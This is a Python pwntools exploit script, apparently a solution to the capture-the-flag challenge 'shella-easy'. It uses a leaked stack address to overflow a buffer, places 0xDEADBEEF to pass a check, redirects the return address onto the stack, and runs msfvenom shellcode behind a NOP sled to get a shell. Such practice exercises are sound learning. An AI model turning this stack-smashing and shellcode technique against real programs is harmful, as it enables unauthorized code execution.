
#!/usr/bin/env python3

from pwn import * 

# initalizing the process
pw = process("./shella-easy")

# Recieve data until the > symbol
pw.recvuntil(b'have a')

the_memory = pw.recv(12)

# sends data to buffer overflow while also sending the address we want
print(the_memory)

payload = b''

# This shellcode is from: msfvenom payload list
buf =  b""
buf += b"\xbe\x05\x55\x5d\x4a\xdb\xdc\xd9\x74\x24\xf4\x5d"
buf += b"\x2b\xc9\xb1\x1f\x31\x75\x15\x83\xed\xfc\x03\x75"
buf += b"\x11\xe2\xf0\x3f\x57\x14\xcb\x64\x90\x4b\x78\xd8"
buf += b"\x0c\xe6\x7c\x6e\xd4\x7f\x61\x43\x99\x17\x3a\x34"
buf += b"\xe5\x17\xbc\xc5\x71\x1a\xbc\xd4\xdd\x93\x5d\xbc"
buf += b"\xbb\xfb\xcd\x10\x13\x75\x0c\xd1\x56\x05\x4b\x16"
buf += b"\x11\x1f\x1d\xe3\xdf\x77\x03\x0b\x20\x88\x1b\x66"
buf += b"\x20\xe2\x9e\xff\xc3\xc3\x69\x32\x83\xa1\xa9\xb4"
buf += b"\x39\x42\x0e\xf5\x45\x2c\x50\xe9\x49\x4e\xd9\xea"
buf += b"\x8b\xa5\xd5\x2d\xe8\x36\x55\xd0\x22\xc6\x10\xeb"
buf += b"\xc5\xd7\x41\x65\xd4\x41\xc7\x1f\xa7\x71\xea\x60"
buf += b"\x42\xb5\x8c\x62\xb2\xd7\xd4\x62\x4c\x18\x24\xde"
buf += b"\x4d\x18\x24\x20\x83\x98"


#gdb.attach(pw, gdbscript = 'b *0x8048548')


# This is to make sure the shellcode lines up with our deadbeef 
payload += b'A' * 64

# The memory address of deadbeef needed to bypass the conditional statement
payload += p32(0xDEADBEEF)

# This is to line up the return address
payload += b'B' * 8


# The return address where are shellcode is in memory
payload += p32(int(the_memory,16) + 88)

payload += b'\x90' * 8

payload += buf

# Sends the payload
pw.sendline(payload)

print(pw.recvline())

# allows us to interact with the process
pw.interactive()
